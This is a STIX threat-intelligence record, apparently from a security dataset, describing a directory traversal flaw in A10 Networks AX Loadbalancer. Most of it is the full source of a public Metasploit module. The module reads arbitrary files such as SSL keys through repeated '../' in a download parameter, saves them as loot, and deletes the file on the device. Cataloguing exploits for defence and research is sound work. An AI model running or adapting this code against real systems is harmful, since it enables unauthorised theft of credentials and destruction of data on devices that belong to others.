{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--f2e7e194-a49f-4e85-bb92-61859a9cf09b",
    "created": "2024-08-14T16:30:03.715337Z",
    "modified": "2024-08-14T16:30:03.715341Z",
    "name": "A10 Networks AX Loadbalancer Directory Traversal",
    "description": " This module exploits a directory traversal flaw found in A10 Networks (Soft) AX Loadbalancer version 2.6.1-GR1-P5/2.7.0 or less.  When handling a file download request, the xml/downloads class fails to properly check the 'filename' parameter, which can be abused to read any file outside the virtual directory. Important files include SSL certificates. This module works on both the hardware devices and the Virtual Machine appliances. IMPORTANT NOTE: This module will also delete the file on the device after downloading it. Because of this, the CONFIRM_DELETE option must be set to 'true' either manually or by script.  'References'     => [ ['OSVDB', '102657'] ['BID', '65206'] ['EDB', '31261'] ]",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/a10networks_ax_directory_traversal.rb",
            "external_id": "a10networks_ax_directory_traversal.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::Scanner\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'A10 Networks AX Loadbalancer Directory Traversal',\n      'Description'    => %q{\n        This module exploits a directory traversal flaw found in A10 Networks\n        (Soft) AX Loadbalancer version 2.6.1-GR1-P5/2.7.0 or less.  When\n        handling a file download request, the xml/downloads class fails to\n        properly check the 'filename' parameter, which can be abused to read\n        any file outside the virtual directory. Important files include SSL\n        certificates. This module works on both the hardware devices and the\n        Virtual Machine appliances. IMPORTANT NOTE: This module will also delete the\n        file on the device after downloading it. Because of this, the CONFIRM_DELETE\n        option must be set to 'true' either manually or by script.\n      },\n      'References'     =>\n        [\n          ['OSVDB', '102657'],\n          ['BID', '65206'],\n          ['EDB', '31261']\n        ],\n      'Author'         =>\n        [\n          'xistence'  # Vulnerability discovery and Metasploit module\n        ],\n      'License'        => MSF_LICENSE,\n      'DisclosureDate' => '2014-01-28'\n    ))\n\n    register_options(\n      [\n        OptString.new('TARGETURI', [true, 'The URI path to the web application', '/']),\n        OptString.new('FILE', [true, 'The file to obtain', '/a10data/key/mydomain.tld']),\n        OptInt.new('DEPTH', [true, 'The max traversal depth to root directory', 10]),\n        OptBool.new('CONFIRM_DELETE', [true, 'Run the module, even when it will delete files', false]),\n      ])\n  end\n\n  def run\n    unless datastore['CONFIRM_DELETE']\n      print_error(\"This module will delete files on vulnerable systems. Please, set CONFIRM_DELETE in order to run it.\")\n      return\n    end\n\n    super\n  end\n\n  def run_host(ip)\n    peer = \"#{ip}:#{rport}\"\n    fname = datastore['FILE']\n\n    print_status(\"Reading '#{datastore['FILE']}'\")\n    traverse = \"../\" * datastore['DEPTH']\n    res = send_request_cgi({\n      'method'   => 'GET',\n      'uri'      => normalize_uri(target_uri.path, \"xml\", \"downloads\", \"\"),\n      'vars_get' =>\n        {\n          'filename' => \"/a10data/tmp/#{traverse}#{datastore['FILE']}\"\n        }\n    })\n\n    if res and res.code == 500 and res.body =~ /Error report/\n      vprint_error(\"Cannot obtain '#{fname}', here are some possible reasons:\")\n      vprint_error(\"\\t1. File does not exist.\")\n      vprint_error(\"\\t2. The server does not have any patches deployed.\")\n      vprint_error(\"\\t3. Your 'DEPTH' option isn't deep enough.\")\n      vprint_error(\"\\t4. Some kind of permission issues.\")\n    elsif res and res.code == 200\n      data = res.body\n      p = store_loot(\n        'a10networks.ax',\n        'application/octet-stream',\n        ip,\n        data,\n        fname\n      )\n      vprint_line(data)\n      print_good(\"#{fname} stored as '#{p}'\")\n    elsif res and res.code == 404 and res.body.to_s =~ /The requested URL.*was not found/\n      vprint_error(\"File not found. Check FILE.\")\n    else\n      vprint_error(\"Fail to obtain file for some unknown reason\")\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2014-01-28"
}